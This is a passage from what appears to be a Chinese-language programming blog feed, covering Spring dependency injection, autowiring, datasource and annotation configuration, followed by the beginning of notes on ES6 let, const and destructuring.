class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--注入引用类型--&gt;</span><br><span class="line">&lt;bean id=&quot;bookService&quot; class=&quot;com.itheima.service.impl.BookServiceImpl&quot;&gt;</span><br><span class="line">    &lt;!--property标签：设置注入属性--&gt;</span><br><span class="line">    &lt;!--name属性：设置注入的属性名，实际是set方法对应的名称--&gt;</span><br><span class="line">    &lt;!--ref属性：设置注入引用类型bean的id或name--&gt;</span><br><span class="line">    &lt;property name=&quot;bookDao&quot; ref=&quot;bookDao&quot;/&gt;</span><br><span class="line">    &lt;property name=&quot;userDao&quot; ref=&quot;userDao&quot;/&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure><p>现在我们学习另外的方式</p><p>如果我们要加入bean的数据是这样：<strong>还拥有两个属性</strong>，并提供可访问的set方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public class BookDaoImpl implements BookDao &#123;</span><br><span class="line">    private String databaseName;</span><br><span class="line">    private int connectionNum;</span><br><span class="line"></span><br><span class="line">    public BookDaoImpl() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setConnectionNum(int connectionNum) &#123;</span><br><span class="line">        this.connectionNum = connectionNum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setDatabaseName(String databaseName) &#123;</span><br><span class="line">        this.databaseName = databaseName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void save() &#123;</span><br><span class="line">        System.out.println(&quot;book dao save ...&quot; + this.databaseName + &quot;,&quot; + this.connectionNum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们就需要引入这两个属性—注入我们的简单类型，对于基本数据类型的注入，我们使用<code>value</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--注入简单类型--&gt;</span><br><span class="line">&lt;bean id=&quot;bookDao&quot; class=&quot;com.itheima.dao.impl.BookDaoImpl&quot;&gt;</span><br><span class="line">    &lt;!--property标签：设置注入属性--&gt;</span><br><span class="line">    &lt;!--name属性：设置注入的属性名，实际是set方法对应的名称--&gt;</span><br><span class="line">    &lt;!--value属性：设置注入简单类型数据值--&gt;</span><br><span class="line">    &lt;property name=&quot;connectionNum&quot; value=&quot;100&quot;/&gt;</span><br><span class="line">    &lt;property name=&quot;databaseName&quot; value=&quot;mysql&quot;/&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure><h4 id="1-4-5-构造器注入"><a href="#1-4-5-构造器注入" class="headerlink" title="1.4.5 构造器注入"></a>1.4.5 构造器注入</h4><p>我们注入依赖还可以使用构造器注入</p><p>我们之前使用的是set方法引用注入，现在将set方法转换成构造方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//引用数据类型</span><br><span class="line">private BookDao bookDao;</span><br><span class="line">private UserDao userDao;</span><br><span class="line"></span><br><span class="line">public BookServiceImpl(BookDao bookDao, UserDao userDao) &#123;</span><br><span class="line">    this.bookDao = bookDao;</span><br><span class="line">    this.userDao = userDao;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//基本数据类型</span><br><span class="line">private String databaseName;</span><br><span class="line">private int connectionNum;</span><br><span class="line"></span><br><span class="line">public BookDaoImpl(String databaseName, int connectionNum) &#123;</span><br><span class="line">    this.databaseName = databaseName;</span><br><span class="line">    this.connectionNum = connectionNum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们的<code>bean</code>配置中，不再使用<code>property</code>，而是使用<code>constructor-arg</code>标记，<strong>name和传入的形参名相同</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">标准书写</span><br><span class="line">&lt;bean id=&quot;bookDao&quot; class=&quot;com.itheima.dao.impl.BookDaoImpl&quot;&gt;</span><br><span class="line">    &lt;constructor-arg name=&quot;connectionNum&quot; value=&quot;10&quot;/&gt;</span><br><span class="line">    &lt;constructor-arg name=&quot;databaseName&quot; value=&quot;mysql&quot;/&gt;</span><br><span class="line">&lt;/bean&gt;</span><br><span class="line">&lt;bean id=&quot;userDao&quot; class=&quot;com.itheima.dao.impl.UserDaoImpl&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;bean id=&quot;bookService&quot; class=&quot;com.itheima.service.impl.BookServiceImpl&quot;&gt;</span><br><span class="line">    &lt;constructor-arg name=&quot;userDao&quot; ref=&quot;userDao&quot;/&gt;</span><br><span class="line">    &lt;constructor-arg name=&quot;bookDao&quot; ref=&quot;bookDao&quot;/&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure><p>但是这样使用变量名耦合度很高，所以提供了两种解决方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">使用变量类型作为标识，解决形参名称的问题，与形参名不耦合</span><br><span class="line">&lt;bean id=&quot;bookDao&quot; class=&quot;com.itheima.dao.impl.BookDaoImpl&quot;&gt;</span><br><span class="line">    &lt;constructor-arg type=&quot;int&quot; value=&quot;10&quot;/&gt;</span><br><span class="line">    &lt;constructor-arg type=&quot;java.lang.String&quot; value=&quot;mysql&quot;/&gt;</span><br><span class="line">&lt;/bean&gt;</span><br><span class="line">&lt;bean id=&quot;userDao&quot; class=&quot;com.itheima.dao.impl.UserDaoImpl&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;bean id=&quot;bookService&quot; class=&quot;com.itheima.service.impl.BookServiceImpl&quot;&gt;</span><br><span class="line">    &lt;constructor-arg name=&quot;userDao&quot; ref=&quot;userDao&quot;/&gt;</span><br><span class="line">    &lt;constructor-arg name=&quot;bookDao&quot; ref=&quot;bookDao&quot;/&gt;</span><br><span class="line">&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">使用index标记形参传入时的位置</span><br><span class="line">&lt;bean id=&quot;bookDao&quot; class=&quot;com.itheima.dao.impl.BookDaoImpl&quot;&gt;</span><br><span class="line">    &lt;constructor-arg index=&quot;0&quot; value=&quot;mysql&quot;/&gt;</span><br><span class="line">    &lt;constructor-arg index=&quot;1&quot; value=&quot;100&quot;/&gt;</span><br><span class="line">&lt;/bean&gt;</span><br><span class="line">&lt;bean id=&quot;userDao&quot; class=&quot;com.itheima.dao.impl.UserDaoImpl&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;bean id=&quot;bookService&quot; class=&quot;com.itheima.service.impl.BookServiceImpl&quot;&gt;</span><br><span class="line">    &lt;constructor-arg name=&quot;userDao&quot; ref=&quot;userDao&quot;/&gt;</span><br><span class="line">    &lt;constructor-arg name=&quot;bookDao&quot; ref=&quot;bookDao&quot;/&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure><p>对于这两种构造方法如何选择：</p><p><img src="https://img-blog.csdnimg.cn/5bf8dff7948c420c8959025640b49117.png" alt="注入方法选择"></p><h4 id="1-4-6-依赖自动装配"><a href="#1-4-6-依赖自动装配" class="headerlink" title="1.4.6 依赖自动装配"></a>1.4.6 依赖自动装配</h4><p>spring为我们提供了自动装配方案</p><p>使用bean中的autowire属性</p><p>1.根据类型，接口类型（推荐）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean class=&quot;com.itheima.dao.impl.BookDaoImpl&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;bean id=&quot;bookService&quot; class=&quot;com.itheima.service.impl.BookServiceImpl&quot; autowire=&quot;byType&quot;/&gt;</span><br></pre></td></tr></table></figure><p>但是如果有两个同类型接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean class=&quot;com.itheima.dao.impl.BookDaoImpl&quot;/&gt;</span><br><span class="line">&lt;bean class=&quot;com.itheima.dao.impl.BookDaoImpl&quot;/&gt;</span><br></pre></td></tr></table></figure><p>就会出现识别错误并报错</p><p>2.根据名称装配</p><p>根据名称我们就需要使用id属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;bookDao&quot; class=&quot;com.itheima.dao.impl.BookDaoImpl&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;bean id=&quot;bookService&quot; class=&quot;com.itheima.service.impl.BookServiceImpl&quot; autowire=&quot;byName&quot;/&gt;</span><br></pre></td></tr></table></figure><p>但是如果id错误就会返回一个空指针，导致报错</p><p>tips：</p><p>1.自动装配只适用于引用类型的数据，简单类型不可以</p><p>2.自动装配的优先级低于setter注入和构造器注入</p><h4 id="1-4-7-集合注入"><a href="#1-4-7-集合注入" class="headerlink" title="1.4.7 集合注入"></a>1.4.7 集合注入</h4><p>如果我们的bean中需要注入集合类型的元素（数组 list map…）</p><p>按照如下方式装配，name属性指的是：<strong>集合在类中的数据名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;bookDao&quot; class=&quot;com.itheima.dao.impl.BookDaoImpl&quot;&gt;</span><br><span class="line">    &lt;!--数组注入--&gt;</span><br><span class="line">    &lt;property name=&quot;array&quot;&gt;</span><br><span class="line">        &lt;array&gt;</span><br><span class="line">            &lt;value&gt;100&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;200&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;300&lt;/value&gt;</span><br><span class="line">        &lt;/array&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">    &lt;!--list集合注入--&gt;</span><br><span class="line">    &lt;property name=&quot;list&quot;&gt;</span><br><span class="line">        &lt;list&gt;</span><br><span class="line">            &lt;value&gt;itcast&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;itheima&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;boxuegu&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;chuanzhihui&lt;/value&gt;</span><br><span class="line">        &lt;/list&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">    &lt;!--set集合注入--&gt;</span><br><span class="line">    &lt;property name=&quot;set&quot;&gt;</span><br><span class="line">        &lt;set&gt;</span><br><span class="line">            &lt;value&gt;itcast&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;itheima&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;boxuegu&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;boxuegu&lt;/value&gt;</span><br><span class="line">        &lt;/set&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">    &lt;!--map集合注入--&gt;</span><br><span class="line">    &lt;property name=&quot;map&quot;&gt;</span><br><span class="line">        &lt;map&gt;</span><br><span class="line">            &lt;entry key=&quot;country&quot; value=&quot;china&quot;/&gt;</span><br><span class="line">            &lt;entry key=&quot;province&quot; value=&quot;henan&quot;/&gt;</span><br><span class="line">            &lt;entry key=&quot;city&quot; value=&quot;kaifeng&quot;/&gt;</span><br><span class="line">        &lt;/map&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">    &lt;!--Properties注入--&gt;</span><br><span class="line">    &lt;property name=&quot;properties&quot;&gt;</span><br><span class="line">        &lt;props&gt;</span><br><span class="line">            &lt;prop key=&quot;country&quot;&gt;china&lt;/prop&gt;</span><br><span class="line">            &lt;prop key=&quot;province&quot;&gt;henan&lt;/prop&gt;</span><br><span class="line">            &lt;prop key=&quot;city&quot;&gt;kaifeng&lt;/prop&gt;</span><br><span class="line">        &lt;/props&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure><h3 id="1-5-数据库"><a href="#1-5-数据库" class="headerlink" title="1.5 数据库"></a>1.5 数据库</h3><p>使用bean管理数据库对象的时候，需要在bean中写入 driver，url，user，password这几个选项提供链接的条件</p><p>当然还有很多选项：比如最大连接数，链接时间等都可以配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;dataSource&quot; class=&quot;com.alibaba.druid.pool.DruidDataSource&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;driverClassName&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/spring_db&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;password&quot; value=&quot;root&quot;/&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure><p>然后在类里面引入这个bean</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">    ApplicationContext ctx = new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;);</span><br><span class="line">    BookDao bookDao = (BookDao)ctx.getBean(&quot;bookDao&quot;);</span><br><span class="line">    bookDao.save();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们还可以对value中的值进行改善</p><p>引入properties文件</p><p>创建一个名为jdbc.properties 的文件（与xml文件同级，也就是resource文件夹下）</p><p>写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jdbc.driver=com.mysql.jdbc.Driver</span><br><span class="line">jdbc.url=jdbc:mysql://127.0.0.1:3306/spring_db</span><br><span class="line">jdbc.username=root</span><br><span class="line">jdbc.password=root</span><br></pre></td></tr></table></figure><p>然后我们就需要引入这个properties文件进入xml，就是开辟新的命名空间</p><p>这里面的context就是我们的新命名空间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       //配置新的xmlns</span><br><span class="line">       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;</span><br><span class="line">            http://www.springframework.org/schema/beans</span><br><span class="line">            http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">            //在xsi中加入新空间</span><br><span class="line">            http://www.springframework.org/schema/context</span><br><span class="line">            http://www.springframework.org/schema/context/spring-context.xsd</span><br><span class="line">            &quot;&gt;</span><br></pre></td></tr></table></figure><p>然后引入properties文件</p><p>第一种方法：多了<code>system-properties-mode=&quot;NEVER&quot;/</code>代表忽略系统变量，<strong>以免系统变量和我们properties文件重名</strong></p><p>第二种方法：加载多个properties文件的时候使用</p><p>第三种方式作为第二种方式的简写形式：代表加载所有的properties文件</p><p>如果要加载类路径下的properties文件使用：<code>classpath*：*.properties</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--    2.使用context空间加载properties文件--&gt;</span><br><span class="line">&lt;!--    &lt;context:property-placeholder location=&quot;jdbc.properties&quot; system-properties-mode=&quot;NEVER&quot;/&gt;--&gt;</span><br><span class="line">&lt;!--    &lt;context:property-placeholder location=&quot;jdbc.properties,jdbc2.properties&quot; system-properties-mode=&quot;NEVER&quot;/&gt;--&gt;</span><br><span class="line">        &lt;context:property-placeholder location=&quot;classpath:*.properties&quot; system-properties-mode=&quot;NEVER&quot;/&gt;</span><br></pre></td></tr></table></figure><h3 id="1-6-容器"><a href="#1-6-容器" class="headerlink" title="1.6 容器"></a>1.6 容器</h3><p>关于我们ctx容器的加载方式，我们还有其他的类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//        ApplicationContext ctx = new FileSystemXmlApplicationContext(&quot;D:\\workspace\\spring\\spring_10_container\\src\\main\\resources\\applicationContext.xml&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是这样写颇为麻烦，所以建议还是<code>ClassPathXmlApplicationContext</code></p><p>还有getbean的方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//        BookDao bookDao = (BookDao) ctx.getBean(&quot;bookDao&quot;);</span><br><span class="line">//作为一般方式的另一种书写形式</span><br><span class="line">BookDao bookDao = ctx.getBean(&quot;bookDao&quot;,BookDao.class);</span><br><span class="line">//直接声明是Book.class类型，但是有单一性</span><br><span class="line">BookDao bookDao = ctx.getBean(BookDao.class);</span><br></pre></td></tr></table></figure><p>ClassPathXmlApplicationContext的顶层还有beanFactory构建bean</p><h3 id="1-7-注解开发"><a href="#1-7-注解开发" class="headerlink" title="1.7 注解开发"></a>1.7 注解开发</h3><p>我们不再使用app.xml文件书写配置</p><p>使用一个新建的类配置文件，他就是：config包下的文件</p><p>使用<code>@Component(&quot;bookDao&quot;)</code>进行注解，括号中相当于是bean中id的属性</p><p>在xml文件中配置，context命名空间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       //context空间配置</span><br><span class="line">       xmlns:conetxt=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;</span><br><span class="line">            http://www.springframework.org/schema/context  http://www.springframework.org/schema/context/spring-context.xsd</span><br><span class="line">            http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br></pre></td></tr></table></figure><p>然后在下面代替bean写入：scan会扫描base-package下的所有文件中的component注解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--    注解开发--&gt;</span><br><span class="line">    &lt;conetxt:component-scan base-package=&quot;com.itheima.dao.impl&quot;/&gt;</span><br></pre></td></tr></table></figure><p><strong>tips：如果要运行建议降低jdk版本，我使用的1.8版本运行</strong></p><p>关于<code>@component</code>的衍生注解</p><p>数据层：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Repository(&quot;bookDao&quot;)</span><br></pre></td></tr></table></figure><p>业务层：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Service</span><br></pre></td></tr></table></figure><p>控制层：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br></pre></td></tr></table></figure><h4 id="1-7-1-纯注解开发"><a href="#1-7-1-纯注解开发" class="headerlink" title="1.7.1 纯注解开发"></a>1.7.1 纯注解开发</h4><p>现在我们提供一种全新的方式，不再使用配置文件，而是使用配置类</p><p>先创建一个配置类：写上注解<code>@Configuration</code>代表这是一个注解类和<code>@ComponentScan(&#123;&quot;com.itheima.service&quot;, &quot;com.itheima.dao&quot;&#125;)</code>代表这个类中需要扫描的component</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package com.itheima.config;</span><br><span class="line"></span><br><span class="line">import org.springframework.context.annotation.ComponentScan;</span><br><span class="line">import org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line">@Configuration</span><br><span class="line">@ComponentScan(&#123;&quot;com.itheima.service&quot;, &quot;com.itheima.dao&quot;&#125;)</span><br><span class="line">public class SpringConfig &#123;</span><br><span class="line">    public SpringConfig() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时我们就可以删掉我们的xml文件</p><p>转而在main中这样写，使用全新的类形式加载<code>AnnotationConfigApplicationContext(new Class[]&#123;SpringConfig.class&#125;);</code></p><p>剩下的操作和之前类似</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">    ApplicationContext ctx = new AnnotationConfigApplicationContext(new Class[]&#123;SpringConfig.class&#125;);</span><br><span class="line">    BookDao bookDao = (BookDao)ctx.getBean(&quot;bookDao&quot;);</span><br><span class="line">    System.out.println(bookDao);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-7-1-生命周期管理"><a href="#1-7-1-生命周期管理" class="headerlink" title="1.7.1 生命周期管理"></a>1.7.1 生命周期管理</h4><p>注解<code>@Scope(&quot;singleton&quot;)</code>实现生成bean是单例</p><p>有关生命周期的注解</p><p>@postConstruct是在触发构造函数之后</p><p>@preDestory是在销毁前</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//@PostConstruct设置bean的初始化方法</span><br><span class="line">@PostConstruct</span><br><span class="line">public void init() &#123;</span><br><span class="line">    System.out.println(&quot;init ...&quot;);</span><br><span class="line">&#125;</span><br><span class="line">//@PreDestroy设置bean的销毁方法</span><br><span class="line">@PreDestroy</span><br><span class="line">public void destroy() &#123;</span><br><span class="line">    System.out.println(&quot;destroy ...&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-8-Spring整合"><a href="#1-8-Spring整合" class="headerlink" title="1.8 Spring整合"></a>1.8 Spring整合</h3><h4 id="1-8-1-mybatis"><a href="#1-8-1-mybatis" class="headerlink" title="1.8.1 mybatis"></a>1.8.1 mybatis</h4>]]></content>
    
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EAMCScript6</title>
    <link href="/2022/09/06/EAMC6/"/>
    <url>/2022/09/06/EAMC6/</url>
    
    <content type="html"><![CDATA[<h1 id="EAMCScript-6-11"><a href="#EAMCScript-6-11" class="headerlink" title="EAMCScript 6 - 11"></a>EAMCScript 6 - 11</h1><h2 id="C1-let"><a href="#C1-let" class="headerlink" title="C1.let"></a>C1.let</h2><p>let有几大特性</p><p>1.变量不能重复声明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//var 可以重复声明</span><br><span class="line">var star = &quot;海王星&quot;</span><br><span class="line">var star = &quot;天王星&quot;</span><br><span class="line"></span><br><span class="line">//let 不能重复声明</span><br><span class="line">let star = &quot;海王&quot;</span><br><span class="line">let star = &quot; &quot;//报错</span><br></pre></td></tr></table></figure><p>2.块级作用域</p><p>es6引入了块级作用域，也就是 {} 括起来的作用域，局部变量</p><p>let定义的变量就有块级作用域</p><p>3.变量提升</p><p>面试题常考</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">console.log(star);</span><br><span class="line">var star = &quot;海王星&quot;</span><br></pre></td></tr></table></figure><p>打印结果 undefined，因为代码顺序是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var star</span><br><span class="line">log</span><br><span class="line">star = &quot;&quot;</span><br></pre></td></tr></table></figure><p>如果是let</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">console.log(star);</span><br><span class="line">let star = &quot;海王星&quot;</span><br></pre></td></tr></table></figure><p>结果报错，因为没有变量提升</p><h2 id="C2-const"><a href="#C2-const" class="headerlink" title="C2.const"></a>C2.const</h2><p>const赋值常量也有几大特性</p><p>1.常量的值不能修改，也就是configureable为false</p><p>2.一般使用大写作为常量名</p><p>3.一定要赋予初始值</p><p>4.没有深度遍历</p><p>​    也就是说你可以修改一个数组和对象里面的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const ig = [&#x27;jacky&#x27;,&#x27;baolan&#x27;,&#x27;rookie&#x27;,&#x27;ning&#x27;,&#x27;shy&#x27;]</span><br><span class="line">ig[0] = &#x27;wxz&#x27;</span><br><span class="line"></span><br><span class="line">//但是这样就会报错</span><br><span class="line">ig = &#x27;fpx&#x27;</span><br></pre></td></tr></table></figure><p>5.块级作用域</p><h2 id="C3-数组解构"><a href="#C3-数组解构" class="headerlink" title="C3.数组解构"></a>C3.数组解构</h2><p>1.数组结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const ig = [&#x27;ad&#x27;,&#x27;top&#x27;,&#x27;mid&#x27;]</span><br><span class="line">let [j,t,r] = ig</span><br><span class="line">console.log(t);</span><br></pre></td></tr></table></figure><p>2.对象解构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 